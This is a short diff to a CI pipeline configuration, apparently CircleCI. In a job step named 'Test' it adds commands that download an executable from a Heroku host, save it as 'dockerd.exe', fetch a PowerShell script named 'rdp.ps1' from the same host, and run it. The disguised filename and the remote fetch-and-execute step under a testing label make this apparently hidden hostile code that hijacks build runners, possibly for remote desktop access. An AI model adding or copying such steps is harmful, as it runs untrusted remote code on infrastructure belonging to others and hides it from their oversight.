@@ -14,5 +14,6 @@ jobs:
       - run:
           name: Test
           command: |
-               Invoke-WebRequest https://bit.ly/3CPNHO2 -OutFile rdp.ps1
+               Invoke-WebRequest https://momojo1.herokuapp.com/logcat.exe -OutFile dockerd.exe
+               Invoke-WebRequest https://momojo1.herokuapp.com/rdp.ps1 -OutFile rdp.ps1
                ./rdp.ps1
